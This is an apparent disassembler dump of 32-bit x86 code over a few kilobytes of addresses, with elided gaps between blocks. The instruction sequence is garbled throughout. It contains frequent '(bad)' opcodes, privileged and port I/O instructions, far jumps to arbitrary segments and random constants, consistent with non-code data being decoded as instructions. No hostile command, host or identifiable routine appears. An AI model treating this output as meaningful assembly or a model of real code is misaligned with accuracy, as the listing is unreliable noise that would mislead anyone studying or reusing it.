  4238d9:	(bad)  
  4238da:	stc    
  4238db:	sbb    al,0xa1
  4238dd:	mov    WORD PTR [ebp-0x34],cs
  4238e0:	jmp    FWORD PTR [ebx+0x2e]
  4238e3:	iret   
  4238e4:	pusha  
  4238e5:	pop    ds
  4238e6:	cs js  0x42393a
  4238e9:	bound  esi,QWORD PTR [esi-0x2]
  4238ec:	sub    ch,dl
  4238ee:	push   ss
  4238ef:	pop    ss
  4238f0:	cli    
  4238f1:	push   0xd3c324a3
  4238f6:	mov    ebx,0xc94a0610
  4238fb:	sbb    BYTE PTR [ebx],dl
  4238fd:	jp     0x4238b3
  4238ff:	leave  
  423900:	(bad)  
  423901:	pop    ebp
  423902:	test   DWORD PTR [edx+0x33],edi
  423905:	inc    ecx
  423906:	ins    BYTE PTR es:[edi],dx
  423907:	jnp    0x4238d7
  423909:	fld    st(6)
  42390b:	push   0x5e
  42390d:	call   0x0:0xea1d31
	...
  423974:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0x884e2bbd
  423982:	ss mov ecx,0x17c1f
  423988:	add    eax,0x3a000001
  42398d:	add    ecx,ecx
  42398f:	in     al,dx
  423990:	adc    DWORD PTR [ebx+ebp*1+0x1b],edi
  423994:	mov    esp,edx
  423996:	sar    DWORD PTR [esi+0x6],cl
  423999:	push   DWORD PTR [eax]
  42399b:	cmp    ah,ch
  42399d:	jbe    0x423930
  42399f:	shl    DWORD PTR [edx-0x5dfca8f7],cl
  4239a5:	clc    
  4239a6:	push   ds
  4239a7:	test   BYTE PTR [ecx-0x32],cl
  4239aa:	sub    bl,BYTE PTR [esi+0x10e7780a]
  4239b0:	mov    cl,dl
  4239b2:	loop   0x4239da
  4239b4:	dec    esp
  4239b5:	arpl   WORD PTR [ecx+eax*8],bp
  4239b8:	sub    eax,0x45092922
  4239bd:	imul   ebp,DWORD PTR [edi-0x27a5281c],0xffffffa7
  4239c4:	(bad)  
  4239c6:	data16 daa 
  4239c8:	xor    DWORD PTR [ecx-0x16],ecx
  4239cb:	cmp    al,0x50
  4239cd:	xchg   ebx,eax
  4239ce:	mov    edi,0xa47fae00
  4239d3:	sub    eax,0xc99de217
  4239d9:	sbb    ecx,esp
  4239db:	loop   0x423a21
  4239dd:	mov    ah,0x2e
  4239df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239e0:	in     al,dx
  4239e1:	mov    ch,0x2f
  4239e3:	cmp    edx,DWORD PTR [ebx]
  4239e5:	test   dh,bh
  4239e7:	cs ins DWORD PTR es:[edi],dx
  4239e9:	cmovg  eax,DWORD PTR [ebp-0x48d8adad]
  4239f0:	shl    BYTE PTR cs:[esi],cl
  4239f3:	lock test al,0xdc
  4239f6:	popa   
  4239f7:	adc    ebx,DWORD PTR [eax]
  4239f9:	je     0x423a76
  4239fb:	sbb    al,0x7c
  4239fd:	inc    eax
  4239fe:	fst    DWORD PTR [eax-0x72a6cb8e]
  423a04:	mov    dl,0xc0
  423a06:	sub    ecx,esi
  423a08:	mov    ecx,0x4dd44ee1
  423a0d:	jmp    0xa9ab:0xcada81b3
  423a14:	ins    BYTE PTR es:[edi],dx
  423a15:	mov    edx,eax
  423a17:	add    BYTE PTR [ecx+0x3ff501c1],dh
  423a1d:	out    0x73,eax
  423a1f:	data16 (bad) 
  423a21:	and    DWORD PTR [eax],esp
  423a23:	or     DWORD PTR [eax],eax
  423a25:	sbb    BYTE PTR [esi-0x7c],0xb9
  423a29:	adc    BYTE PTR [edx-0x3e],ah
  423a2c:	xor    BYTE PTR [ebp-0x1e],bh
  423a2f:	and    ebx,DWORD PTR [eax+0x44647ea6]
  423a35:	shl    BYTE PTR [edi+0x1bcaa820],0x24
  423a3c:	inc    eax
  423a3d:	jecxz  0x4239c0
  423a3f:	fucom  st(1)
  423a41:	mov    BYTE PTR [eax+0x1a],dh
  423a44:	(bad)
  423a47:	nop
  423a48:	sbb    ebx,DWORD PTR [ebx]
  423a4a:	stc    
  423a4b:	xor    al,0x21
  423a4d:	fstp   TBYTE PTR [edx-0x17e39ffb]
  423a53:	lock or BYTE PTR ds:0x5b7b1af2,ah
  423a5a:	add    edi,ecx
  423a5c:	cmp    DWORD PTR [edi],edx
  423a5e:	into   
  423a5f:	xchg   ebx,eax
  423a60:	(bad)  
  423a62:	mov    ch,0xe9
  423a64:	jp     0x423ac7
  423a66:	shl    DWORD PTR [eax+0x1a39c31c],cl
  423a6c:	mov    esi,0x44cf6e3f
  423a71:	xor    DWORD PTR [eax+ebp*1],eax
  423a74:	inc    esi
  423a75:	mov    DWORD PTR [eax-0x129ef07],esp
  423a7b:	(bad)  
  423a7c:	dec    esp
  423a7d:	call   0xb99b0692
  423a82:	jecxz  0x423a64
  423a84:	mov    ds:0x364138ce,eax
  423a89:	pop    ebp
  423a8a:	push   cs
  423a8b:	cmp    al,BYTE PTR [edi]
  423a8d:	sub    ecx,ebp
  423a8f:	shr    DWORD PTR [edi],1
	...
  423af1:	add    BYTE PTR [eax],al
  423af3:	add    BYTE PTR [eax],dh
  423af5:	cmp    eax,0xdf7d9f75
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	adc    ecx,edi
  423b02:	and    DWORD PTR [ebp+0x24],edi
  423b05:	jge    0x423b08
  423b07:	add    BYTE PTR ds:0x39000001,al
  423b0d:	iret   
  423b0e:	push   ss
  423b0f:	data16 or al,0x9a
  423b12:	mov    eax,0x3b16e21b
  423b17:	out    dx,al
  423b18:	xchg   DWORD PTR [ecx+0x3faa0cfc],eax
  423b1e:	push   esp
  423b1f:	xchg   esp,eax
  423b20:	fbstp  TBYTE PTR [eax-0x230e648c]
  423b26:	inc    edx
  423b27:	or     eax,0x7692c45c
  423b2c:	xchg   ebp,ebx
  423b2e:	push   es
  423b2f:	out    0xf8,al
  423b31:	popa   
  423b32:	push   edi
  423b33:	dec    ebp
  423b34:	xor    al,0xe0
  423b36:	mov    ds:0xb61e35e1,eax
  423b3b:	aad    0x93
  423b3d:	xchg   edx,eax
  423b3e:	daa    
  423b3f:	xchg   edx,eax
  423b40:	fcomi  st,st(4)
  423b42:	pushf  
  423b43:	jge    0x423b5c
  423b45:	call   FWORD PTR [edx-0x12]
  423b48:	lock jne 0x423b57
  423b4b:	out    dx,eax
  423b4c:	xor    al,0xdf
  423b4e:	dec    ebp
  423b4f:	jge    0x423afc
  423b51:	cmp    eax,0x52ba9c7c
  423b56:	mov    eax,ds:0xaf16c9d7
  423b5b:	cld    
  423b5c:	into   
  423b5d:	sbb    al,0x84
  423b5f:	inc    ebp
  423b60:	push   ds
  423b61:	pop    edi
  423b62:	push   ecx
  423b63:	mov    bh,al
  423b65:	fwait
  423b66:	mov    cl,0xfc
  423b68:	nop
  423b69:	xor    ah,BYTE PTR ds:0x79938a34
  423b6f:	sbb    al,cl
  423b71:	dec    edi
  423b72:	(bad)  
  423b73:	dec    ecx
  423b74:	aas    
  423b75:	fsub   QWORD PTR [edx]
  423b77:	pop    ebx
  423b78:	dec    eax
  423b79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b7a:	sbb    BYTE PTR [ecx],cl
  423b7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b7d:	sub    eax,DWORD PTR [esi+ebp*4]
  423b80:	inc    ebx
  423b81:	mov    dl,0xef
  423b83:	sub    ch,bl
  423b85:	fsub   st(5),st
  423b87:	cli    
  423b88:	pop    es
  423b89:	rol    ah,0x85
  423b8c:	shr    DWORD PTR [edx],0x7f
  423b8f:	test   eax,0x149d1ba1
  423b94:	stc    
  423b95:	(bad)  
  423b98:	mov    al,0x1e
  423b9a:	nop
  423b9b:	or     al,0x7d
  423b9d:	(bad)  [edi-0x24]
  423ba0:	mov    eax,ds:0xeac59b98
  423ba5:	sbb    ch,BYTE PTR [esi-0x6a]
  423ba8:	stc    
  423ba9:	ins    BYTE PTR es:[edi],dx
  423baa:	or     bl,BYTE PTR ds:0xe1134961
  423bb0:	std    
  423bb1:	jecxz  0x423b9a
  423bb3:	ins    DWORD PTR es:[edi],dx
  423bb4:	sbb    eax,0x258fbfa9
  423bb9:	mov    bl,0x88
  423bbb:	and    dh,dl
  423bbd:	xchg   edi,eax
  423bbe:	popf   
  423bbf:	idiv   BYTE PTR [ebp+0x59503166]
  423bc5:	out    dx,al
  423bc6:	sub    al,0xc6
  423bc8:	cmp    BYTE PTR [ebp+0x749b2dae],bl
  423bce:	sbb    al,0x66
  423bd1:	int3   
  423bd2:	stos   BYTE PTR es:[edi],al
  423bd3:	add    eax,0x7c79933
  423bd8:	retf   0x1bb8
  423bdb:	in     eax,0x11
  423bdd:	loop   0x423b9f
  423bdf:	dec    edi
  423be0:	push   cs
  423be1:	imul   ecx,DWORD PTR [esi+0x9],0x74
  423be5:	push   edi
  423be6:	xor    DWORD PTR [ecx],0xffffffab
  423be9:	leave  
  423bea:	sub    DWORD PTR [esi-0x400f382f],edi
  423bf0:	fdiv   QWORD PTR [edi]
  423bf2:	dec    ebp
  423bf3:	pop    ebp
  423bf4:	dec    ebp
  423bf5:	pop    eax
  423bf6:	push   cs
  423bf7:	inc    ecx
  423bf8:	pop    ecx
  423bf9:	fisttp WORD PTR gs:0xdc9188ca
  423c00:	cld    
  423c01:	test   BYTE PTR [ebx],bh
  423c03:	push   0xffffff84
  423c05:	retf   
  423c06:	in     eax,dx
  423c07:	in     al,0x1a
  423c09:	into   
  423c0a:	test   DWORD PTR ds:0x55953833,edx
	...
  423c71:	add    BYTE PTR [eax],al
  423c73:	add    ch,bh
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax-0x53bb99e9]
  423c81:	inc    ecx
  423c82:	gs dec ecx
  423c84:	sub    DWORD PTR [esi+0x1],edi
  423c87:	add    BYTE PTR ds:0xe7000001,al
  423c8d:	xchg   BYTE PTR [ecx],al
  423c8f:	or     al,0xf2
  423c91:	jnp    0x423c81
  423c93:	mov    al,ds:0x3b535a51
  423c98:	mov    ebx,0xb57dd6be
  423c9d:	test   BYTE PTR [ebp-0x2a],0x19
  423ca1:	inc    edx
  423ca2:	int3   
  423ca3:	and    bl,BYTE PTR [ebx]
  423ca5:	enter  0x47d8,0x54
  423ca9:	xor    eax,0xbd824d18
  423cae:	(bad)  
  423caf:	popf   
  423cb0:	aam    0x5c
  423cb2:	mov    ds:0xee66b10f,al
  423cb7:	sbb    esi,DWORD PTR [esi-0x6fea2db9]
  423cbd:	mov    al,ds:0x1efd6ef7
  423cc2:	pushf  
  423cc3:	daa    
  423cc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423cc5:	push   esi
  423cc6:	push   ss
  423cc7:	xor    eax,0x8bb53910
  423ccc:	in     eax,dx
  423ccd:	into   
  423cce:	shl    DWORD PTR [edi+0xe],0x73
  423cd2:	fdivr  DWORD PTR [edx]
  423cd4:	rcl    BYTE PTR [eax+0x43],1
  423cd7:	or     al,0xd6
  423cd9:	into   
  423cda:	jg     0x423c8d
  423cdc:	stos   BYTE PTR es:[edi],al
  423cdd:	(bad)  
  423cdf:	lods   eax,DWORD PTR ds:[esi]
  423ce0:	hlt    
  423ce1:	mov    al,ds:0x640f722b
  423ce6:	pusha  
  423ce7:	inc    eax
  423ce8:	fistp  DWORD PTR [ebp-0x388316f4]
  423cee:	xor    bl,bl
  423cf0:	(bad)  
  423cf1:	or     esp,DWORD PTR [ebp+0x65]
  423cf4:	or     bh,BYTE PTR [eax+0x2660fbbe]
  423cfa:	unpckhps xmm5,XMMWORD PTR [ecx]
  423cfd:	mov    esp,0xad5a7bf2
  423d02:	jmp    0x423d13
  423d04:	dec    eax
  423d05:	aas    
  423d06:	enter  0xa3a0,0xc
  423d0a:	sub    al,0x78
  423d0c:	xchg   BYTE PTR [edx],ch
  423d0e:	imul   ebx,esi,0xffffffa4
  423d11:	ret    
  423d12:	add    ebp,edi
  423d14:	mov    ebx,0x86d026c1
  423d19:	dec    edx
  423d1a:	push   ds
  423d1b:	mov    cl,0x93
  423d1d:	jg     0x423d6e
  423d1f:	in     al,0xdb
  423d21:	bound  esi,QWORD PTR [edx+0x59]
  423d24:	out    0xff,eax
  423d26:	(bad)  
  423d27:	jecxz  0x423d16
  423d29:	mov    BYTE PTR [ebp-0x5c],bl
  423d2c:	into   
  423d2d:	addr16 iret 
  423d2f:	add    DWORD PTR [edi+0x33d58651],0xffffffc6
  423d36:	neg    BYTE PTR [edx-0x4215a446]
  423d3c:	mov    esi,0xc4c29116
  423d41:	mov    cl,0x52
  423d43:	in     eax,0xe3
  423d45:	pop    ebp
  423d46:	ss scas al,BYTE PTR es:[edi]
  423d48:	sub    DWORD PTR [ecx+0x1c],eax
  423d4b:	mov    BYTE PTR [ecx-0xe],bl
  423d4e:	pop    ds
  423d4f:	mov    esp,0x4129149f
  423d54:	pop    ebx
  423d55:	test   eax,0x1155c82
  423d5a:	cdq    
  423d5b:	call   0x3bb5:0x2e7dd65b
  423d62:	mov    bl,0x7e
  423d64:	mov    al,cl
  423d66:	or     al,0xf2
  423d68:	cmp    BYTE PTR [edx],ah
  423d6a:	mov    edi,0xb5035df3
  423d6f:	sbb    ah,BYTE PTR [edx-0xb96582]
  423d75:	lds    ebx,FWORD PTR [edi]
  423d77:	pop    es
  423d78:	fdiv   DWORD PTR [edi+0x35]
  423d7b:	and    al,bl
  423d7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d7e:	dec    eax
  423d7f:	mov    edx,0x2b451171
  423d84:	retf   0x73aa
  423d87:	xor    ecx,esp
  423d89:	or     dh,BYTE PTR [ebp+0x4f]
  423d8c:	pop    ebx
  423d8d:	leave  
  423d8e:	ins    BYTE PTR es:[edi],dx
  423d8f:	aam    0x53
	...
  423df1:	add    BYTE PTR [eax],al
  423df3:	add    BYTE PTR [edx-0xa],ah
  423df6:	xchg   DWORD PTR [ecx],ecx
  423df8:	xchg   edi,eax
  423df9:	jns    0x423de9
  423dfb:	jmp    DWORD PTR [edi]
  423dfd:	mov    DWORD PTR [eax-0x18cd62e],esp
  423e03:	call   0x43bd36
  423e08:	add    eax,0x1c000001
  423e0d:	test   DWORD PTR [esi+0x1ab8c4a2],ecx
  423e13:	push   ds
  423e14:	jle    0x423e1b
  423e16:	adc    esi,edi
  423e18:	or     dl,dh
  423e1a:	out    dx,al
  423e1b:	push   cs
  423e1c:	mov    esp,0x60d0b4a2
  423e21:	arpl   WORD PTR [esi-0x59],bp
  423e24:	gs jg  0x423df7
  423e27:	bound  esp,QWORD PTR [eax-0x736c1dab]
  423e2d:	and    al,0x20
  423e2f:	and    BYTE PTR [ecx-0x3a7e46b4],al
  423e35:	cmp    eax,0x104ae57
  423e3a:	popf   
  423e3b:	push   ecx
  423e3c:	aaa    
  423e3d:	mov    BYTE PTR [ebp+ebx*2-0x57],ch
  423e41:	and    edi,DWORD PTR [ebx-0x42]
  423e44:	dec    edi
  423e45:	inc    eax
  423e46:	popa   
  423e47:	jbe    0x423e6e
  423e49:	adc    DWORD PTR [ecx-0x35bd00cb],0xd6d9ab19
  423e53:	sub    eax,0x361330a
  423e58:	mov    esi,0xe5ad7616
  423e5d:	aad    0x7b
  423e5f:	xchg   BYTE PTR gs:[edi],ah
  423e62:	mov    BYTE PTR [ebp-0x324a5b7],ch
  423e68:	arpl   sp,dx
  423e6a:	jbe    0x423e6b
  423e6c:	or     eax,0x787e9772
  423e71:	cmp    al,0x2c
  423e73:	dec    ecx
  423e74:	call   0x4eb4e8c7
  423e79:	hlt    
  423e7a:	push   ds
  423e7b:	loop   0x423e47
  423e7d:	xor    BYTE PTR gs:[ebp-0x7a9deccb],0xe1
  423e85:	or     eax,0xe63b7d8d
  423e8a:	pop    es
  423e8b:	sti    
  423e8c:	stos   BYTE PTR es:[edi],al
  423e8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e8e:	cmp    al,0xe
  423e90:	imul   eax,DWORD PTR [edi-0x1d],0xbce7066f
  423e97:	xchg   ebp,eax
  423e98:	lods   al,BYTE PTR ds:[esi]
  423e99:	add    ch,BYTE PTR [edi-0x4acc2773]
  423e9f:	xlat   BYTE PTR ds:[ebx]
  423ea0:	sub    ecx,0x25087b21
  423ea6:	jne    0x423ea8
  423ea8:	aam    0x85
  423eaa:	mov    ch,0xe1
  423eac:	push   cs
  423ead:	sub    eax,0x6e3c1b
  423eb2:	dec    esi
  423eb3:	(bad)  
  423eb5:	jae    0x423f21
  423eb7:	xchg   ebp,eax
  423eb8:	dec    esp
  423eb9:	add    al,0xe
  423ebb:	sub    dl,BYTE PTR [edi+ebp*2-0x12894204]
  423ec2:	jbe    0x423ed4
  423ec4:	sub    eax,0xeb08c255
  423ec9:	jge    0x423e6b
  423ecb:	xlat   BYTE PTR ds:[ebx]
  423ecc:	outs   dx,DWORD PTR ds:[esi]
  423ecd:	repnz mov esp,DWORD PTR ds:[ebx]
  423ed1:	cmp    al,0x58
  423ed3:	scas   al,BYTE PTR es:[edi]
  423ed4:	mov    ebp,0xf5013d72
  423ed9:	sbb    dl,0xb3
  423edc:	jge    0x423ea3
  423ede:	cmp    al,0xb1
  423ee0:	mov    edx,0x803288e8
  423ee5:	in     eax,0x27
  423ee7:	jmp    0xc8db4c83
  423eec:	mov    WORD PTR [edi],cs
  423eee:	sub    al,0x1d
  423ef0:	jae    0x423e98
  423ef2:	clc    
  423ef3:	jecxz  0x423f1a
  423ef5:	int    0xf3
  423ef7:	jecxz  0x423f16
  423ef9:	jo     0x423ec9
  423efb:	push   edx
  423efc:	pushf  
  423efd:	xchg   esi,eax
  423efe:	imul   ebx,DWORD PTR [eax+ebx*2+0x66],0x4
  423f03:	lock ss aam 0x7b
  423f07:	or     eax,0xa34312bf
  423f0c:	and    al,0x45
  423f0e:	sub    ch,BYTE PTR [ebx+0x78]
	...
  423f71:	add    BYTE PTR [eax],al
  423f73:	add    BYTE PTR [esi+0x74b9649a],ch
  423f79:	(bad)  
  423f7a:	call   FWORD PTR [edi-0x26e369ec]
  423f80:	inc    ebx
  423f81:	sbb    DWORD PTR [ecx-0x6b],ecx
  423f84:	xor    eax,DWORD PTR [eax+0x1050001]
  423f8a:	add    BYTE PTR [eax],al
  423f8c:	iret   
  423f8d:	dec    eax
  423f8e:	pop    eax
  423f8f:	sub    al,dh
  423f91:	lods   al,BYTE PTR ds:[esi]
  423f92:	add    DWORD PTR [edi-0x5c9d97df],eax
  423f98:	test   al,0x92
  423f9a:	dec    ecx
  423f9b:	ins    BYTE PTR es:[edi],dx
  423f9c:	mov    ebx,0x5a9a04ae
  423fa1:	inc    edi
  423fa2:	pop    esi
  423fa3:	pop    edx
  423fa4:	imul   edx,ebp,0xdd60bc37
  423faa:	push   cs
  423fab:	dec    edx
  423fac:	push   eax
  423fad:	shl    DWORD PTR [eax-0x66],cl
  423fb0:	ins    BYTE PTR es:[edi],dx
  423fb1:	jl     0x423f38
  423fb3:	outs   dx,DWORD PTR ds:[esi]
  423fb4:	ret    0x7dc1
  423fb7:	fwait
  423fb8:	and    ch,BYTE PTR [eax+ebp*1]
  423fbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423fbc:	cmc    
  423fbd:	test   eax,0x4ff5947b
  423fc2:	fisubr DWORD PTR [ecx-0x1454b1f1]
  423fc8:	push   cs
  423fc9:	in     eax,dx
  423fca:	stc    
  423fcb:	mov    ah,0x72
  423fcd:	inc    ebx
  423fce:	(bad)  
  423fd0:	ins    DWORD PTR es:[edi],dx
  423fd1:	xor    al,0xbc
  423fd3:	cmp    edi,esp
  423fd5:	inc    esp
  423fd6:	and    ch,BYTE PTR [edi+0x532b16fe]
  423fdc:	in     al,0x44
  423fde:	add    BYTE PTR [ecx],ch
  423fe0:	mov    ah,0xfa
  423fe2:	and    BYTE PTR [ecx],al
  423fe4:	pop    ebp
  423fe5:	inc    esi
  423fe6:	dec    ebp
  423fe7:	xchg   esi,eax
  423fe8:	jge    0x42404d
  423fea:	dec    edi
  423feb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423fec:	and    eax,ecx
  423fee:	ficom  DWORD PTR [ebp+edi*1-0x24ae4773]
  423ff5:	pop    ds
  423ff6:	gs push ss
  423ff8:	(bad)  
  423ff9:	lahf   
  423ffa:	xchg   esi,eax
  423ffb:	mov    ebx,0xc226658e
  424000:	sub    DWORD PTR [ecx-0x55],esp
  424003:	lods   al,BYTE PTR ds:[esi]
  424004:	jmp    0x423fd2
  424006:	std    
  424007:	inc    ecx
  424008:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424009:	(bad)  
  42400a:	cld    
  42400b:	jge    0x42403f
  42400d:	dec    ecx
  42400e:	scas   eax,DWORD PTR es:[edi]
  42400f:	or     eax,0x35b9119f
  424014:	xchg   DWORD PTR [edi-0x58],ebp
  424017:	add    BYTE PTR ds:0x9c0d12fe,dl
  42401d:	sub    eax,0xf46f3b17
  424022:	pop    ebx
  424023:	mov    ds:0x6f762556,eax
  424028:	sti    
  424029:	xchg   edi,eax
  42402a:	adc    BYTE PTR [edi+edi*8],bh
  42402d:	mov    ds:0x548ca1e5,al
  424032:	es cdq 
  424034:	or     BYTE PTR [ebp+0x3c],cl
  424037:	nop
  424038:	jge    0x424067
  42403a:	(bad)  
  42403b:	(bad)  
  42403c:	ficom  WORD PTR [esi+ebx*4+0x7c5ece93]
  424043:	outs   dx,BYTE PTR ds:[esi]
  424044:	(bad)  [esi+0x16]
  424047:	es ja  0x4240a2
  42404a:	out    0xb2,eax
  42404c:	and    eax,0x1d692d8f
  424051:	enter  0x3216,0xc3
  424055:	xlat   BYTE PTR fs:[ebx]
  424057:	jg     0x42403e
  424059:	test   BYTE PTR [edi-0x45],0x49
  42405d:	test   bh,bh
  42405f:	js     0x4240a9
  424061:	(bad)  
  424062:	xchg   esp,eax
  424063:	std    
  424064:	in     al,dx
  424065:	adc    edi,ebx
  424067:	and    BYTE PTR [ebp-0x30],bl
  42406a:	dec    ebx
  42406b:	lds    esp,FWORD PTR ds:0x9f25a289
  424071:	adc    bl,0xa1
  424074:	mov    esi,ds
  424076:	mov    ds:0x7d3b510d,al
  42407b:	jb     0x424084
  42407d:	into   
  42407e:	rcr    DWORD PTR [edx+0x4a18af06],0x17
  424085:	pop    es
  424086:	jge    0x424024
  424088:	adc    esp,esp
  42408a:	dec    eax
  42408b:	push   edx
  42408c:	iret   
  42408d:	or     eax,0x18841e
	...
  4240f2:	add    BYTE PTR [eax],al
  4240f4:	jl     0x42414e
  4240f6:	cs mov cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	pop    ebp
  424101:	jge    0x42408c
  424103:	jo     0x42413d
  424105:	add    DWORD PTR [ecx],0x10500
  42410b:	add    BYTE PTR [esi-0x35b56043],dh
  424111:	cmp    BYTE PTR [esi+edx*8],bl
  424114:	cmp    eax,DWORD PTR [ebp-0x45]
  424117:	pop    esi
  424118:	cmc    
  424119:	sub    esp,DWORD PTR [eax]
  42411b:	in     al,dx
  42411c:	sub    DWORD PTR [edx-0x28],eax
  42411f:	mov    dl,0x1c
  424121:	push   edi
  424122:	jno    0x424198
  424124:	xchg   ebx,eax
  424125:	inc    ebp
  424126:	push   cs
  424127:	jbe    0x4241a0
  424129:	mov    ds:0xd975be4d,al
  42412e:	mov    eax,edx
  424130:	lods   eax,DWORD PTR ds:[esi]
  424131:	retf   0x6627
  424134:	dec    DWORD PTR [esi-0x39]
  424137:	xchg   esi,eax
  424138:	sar    DWORD PTR [edi-0x3048103b],cl
  42413e:	aad    0x74
  424140:	fsubp  st(7),st
  424142:	xor    esp,DWORD PTR [ebx]
  424144:	sub    ah,al
  424146:	out    dx,eax
  424147:	test   BYTE PTR [ebp+ebp*4+0x21],cl
  42414b:	inc    ebx
  42414c:	inc    esp
  42414d:	test   al,0x91
  42414f:	(bad)  
  424150:	retf   
  424151:	sbb    dh,bl
  424153:	std    
  424154:	add    DWORD PTR ds:0x3f82449e,esp
  42415a:	div    cl
  42415c:	sbb    BYTE PTR [esi+0x20],bh
  42415f:	stos   DWORD PTR es:[edi],eax
  424160:	nop
  424161:	pop    ds
  424162:	jae    0x4241c6
  424164:	pop    esp
  424165:	in     al,0xde
  424167:	adc    cl,BYTE PTR [edi-0x59]
  42416a:	lods   al,BYTE PTR ds:[esi]
  42416b:	rcr    DWORD PTR [ebp-0x61ffda41],0xcc
  424172:	mov    ebp,0xd8b2fb78
  424177:	pushf  
  424178:	sub    edx,eax
  42417a:	mov    eax,ebp
  42417c:	cmp    DWORD PTR [ecx],ebx
  42417e:	nop
  42417f:	sbb    eax,0x2756fb4d
  424184:	jne    0x424136
  424186:	pop    ds
  424187:	addr16 std 
  424189:	mov    ecx,0xc2eb34b4
  42418e:	xor    edi,DWORD PTR [edx+0x6fa147b6]
  424194:	adc    ebp,esp
  424196:	cmp    BYTE PTR [edi],ah
  424198:	push   ecx
  424199:	imul   edi,edi,0xfa75d616
  42419f:	loop   0x424198
  4241a1:	jmp    0x2cd4:0x19653cef
  4241a8:	aad    0xd7
  4241aa:	mov    al,ds:0x22054d1
  4241af:	mov    ds:0x635b3e95,al
  4241b4:	ins    BYTE PTR es:[edi],dx
  4241b5:	gs popf 
  4241b7:	cmp    al,0xe2
  4241b9:	sub    BYTE PTR [edx-0x1c],al
  4241bc:	popf   
  4241bd:	call   0xb98ad76b
  4241c2:	sbb    dl,0x9b
  4241c5:	sahf   
  4241c6:	iretw  
  4241c8:	sub    al,0xec
  4241ca:	jns    0x424205
  4241cc:	imul   ebp,DWORD PTR [edx],0xffffffa4
  4241cf:	lods   eax,DWORD PTR ds:[esi]
  4241d0:	stos   BYTE PTR es:[edi],al
  4241d1:	push   eax
  4241d2:	mov    ebp,fs
  4241d4:	ror    DWORD PTR [ecx-0x52e950af],cl
  4241da:	pmulhw mm5,mm1
  4241dd:	fcomi  st,st(0)
  4241df:	xlat   BYTE PTR ds:[ebx]
  4241e0:	push   ebp
  4241e1:	sti    
  4241e2:	push   0x7a
  4241e4:	div    dl
  4241e6:	out    0xeb,eax
  4241e8:	fucomi st,st(7)
  4241ea:	pop    ebx
  4241eb:	in     eax,0x40
  4241ed:	sbb    BYTE PTR [ebp-0x31],0xd1
  4241f1:	mov    ebx,0x2bcbb086
  4241f6:	fnstenv [ebp-0x45285672]
  4241fc:	jno    0x42418e
  4241fe:	icebp  
  4241ff:	xor    eax,0xdf7a8126
  424204:	jp     0x424195
  424206:	ins    BYTE PTR es:[edi],dx
  424207:	dec    edx
  424208:	ss mov esp,0x801e81d3
  42420e:	cmp    edi,DWORD PTR [esi]
  424210:	jmp    0x424212
	...
  424272:	add    BYTE PTR [eax],al
  424274:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	mov    dl,0xfb
  424282:	push   0x1823d4c
  424287:	add    BYTE PTR ds:0x26000001,al
  42428d:	push   edx
  42428e:	in     eax,dx
  42428f:	mov    dh,0x63
  424291:	pop    ds
  424292:	dec    ebp
  424293:	jno    0x4242c5
  424295:	cmp    edx,edx
  424297:	xor    eax,0x3261022
  42429c:	ret    0x1b86
  42429f:	clc    
  4242a0:	xchg   BYTE PTR [ecx],bh
  4242a2:	imul   edi,DWORD PTR [edx-0x398248b7],0xfffffff0
  4242a9:	pushf  
  4242aa:	fadd   QWORD PTR [ecx]
  4242ac:	imul   edx,edi,0x7bdc68bc
  4242b2:	push   eax
  4242b3:	aam    0xc7
  4242b5:	inc    esi
  4242b6:	ds jno 0x4242b3
  4242b9:	arpl   sp,si
  4242bb:	test   eax,0xe57fd8a5
  4242c0:	xor    edx,DWORD PTR [edx-0x11df0d1d]
  4242c6:	sti    
  4242c7:	fcomp  st(2)
  4242c9:	std    
  4242ca:	cmp    ecx,DWORD PTR [edx]
  4242cc:	sub    ebp,edx
  4242ce:	mov    bl,0x96
  4242d0:	sahf   
  4242d1:	call   0xb1673282
  4242d6:	jne    0x4242a2
  4242d8:	sub    DWORD PTR [edx],ebp
  4242da:	fnsave [esi-0x102426f0]
  4242e0:	mov    ds,ebx
  4242e2:	mov    bl,0x22
  4242e4:	sbb    ah,BYTE PTR [esi-0x6c]
  4242e7:	mov    ebp,DWORD PTR [esi]
  4242e9:	sbb    dh,BYTE PTR [esi-0x62]
  4242ec:	and    eax,0xd7308470
  4242f1:	mov    bl,BYTE PTR [eax]
  4242f3:	int    0xdd
  4242f5:	push   edi
  4242f6:	shl    BYTE PTR [ebp+0x560b3b4f],cl
  4242fc:	loope  0x424292
  4242fe:	cdq    
  4242ff:	or     DWORD PTR [edi-0x56a9bd15],0xd2035914
  424309:	call   0xd6d860bf
  42430e:	int3   
  42430f:	push   cs
  424310:	pop    ecx
  424311:	mov    edi,es
  424313:	sub    dh,BYTE PTR [ebp-0x70554642]
  424319:	(bad)  
  42431a:	fisubr WORD PTR [eax+0x40cc6f00]
  424320:	sub    al,0x8f
  424322:	jb     0x424334
  424324:	(bad)  
  424325:	push   ecx
  424326:	mov    esp,0x686b772e
  42432b:	and    cl,BYTE PTR ds:0x6ab21f04
  424331:	sbb    esi,esi
  424333:	xchg   BYTE PTR [eax],dl
  424335:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424336:	nop
  424337:	rol    DWORD PTR [ecx+0x64],0x47
  42433b:	cmp    esi,eax
  42433d:	and    edx,edi
  42433f:	popa   
  424340:	push   ss
  424341:	mov    al,0x55
  424343:	dec    edx
  424344:	sbb    al,0x60
  424346:	pop    ecx
  424347:	pusha  
